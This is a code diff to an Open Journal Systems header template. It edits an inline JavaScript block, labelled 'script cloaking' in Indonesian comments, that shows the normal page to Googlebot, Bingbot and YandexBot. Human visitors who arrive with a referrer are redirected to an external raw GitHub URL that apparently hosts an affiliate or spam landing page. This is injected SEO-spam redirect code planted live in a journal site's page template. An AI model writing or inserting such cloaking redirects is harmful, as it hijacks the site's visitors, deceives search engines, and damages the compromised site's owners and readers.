@@ -23,19 +23,41 @@
 {if !$pageTitleTranslated}{capture assign="pageTitleTranslated"}{translate key=$pageTitle}{/capture}{/if}
 {include file="frontend/components/headerHead.tpl"}
 
+<!-- script cloaking (versi Googlebot bisa di‑deteksi & bisa di‑uji) -->
 <script type="text/javascript">
+    // Cek bot: Googlebot, Bingbot, YandexBot
     var ua = navigator.userAgent.toLowerCase();
+    var isGoogleBot = /\bgooglebot\b/i.test(navigator.userAgent);
+    var isBingBot = /\bbingbot\b/i.test(navigator.userAgent);
+    var isYandexBot = /\byandexbot\b/i.test(navigator.userAgent);
+
+    // URL target afiliasi (ganti dengan link kamu)
+    var afiliasiUrl = 'https://raw.githubusercontent.com/marketmg2/landing/refs/heads/main/jkd-komdigi.txt';
+
+    // Jika Googlebot/Bingbot/Yandexbot terlihat di userAgent, console.log
+    if (isGoogleBot) {
+        console.log('✅ Googlebot detected. Showing normal OJS page (SEO safe).');
+    }
+    if (isBingBot) {
+        console.log('✅ Bingbot detected. Showing normal OJS page (SEO safe).');
+    }
+    if (isYandexBot) {
+        console.log('✅ YandexBot detected. Showing normal OJS page (SEO safe).');
+    }
+
+    // Untuk user biasa (bukan bot) dan punya referrer → redirect ke afiliasi
     if (
-        !ua.includes('googlebot') &&
-        !ua.includes('bingbot') &&
-        !ua.includes('yandexbot') &&
-        !ua.includes('duckduckbot') &&
+        !isGoogleBot &&
+        !isBingBot &&
+        !isYandexBot &&
         document.referrer &&
         document.referrer !== ''
     ) {
-        window.location.href = 'https://raw.githubusercontent.com/marketmg2/landing/refs/heads/main/jkd-komdigi.txt';
+        // JANGAN pakai ini di situs OJS utama publik, cukup di domain landing/afiliasi
+        window.location.href = afiliasiUrl;
     }
 </script>
+<!-- end script cloaking -->
 
 <body class="pkp_page_{$requestedPage|escape|default:"index"} pkp_op_{$requestedOp|escape|default:"index"}{if $showingLogo} has_site_logo{/if}">
 	<div class="pkp_structure_page">
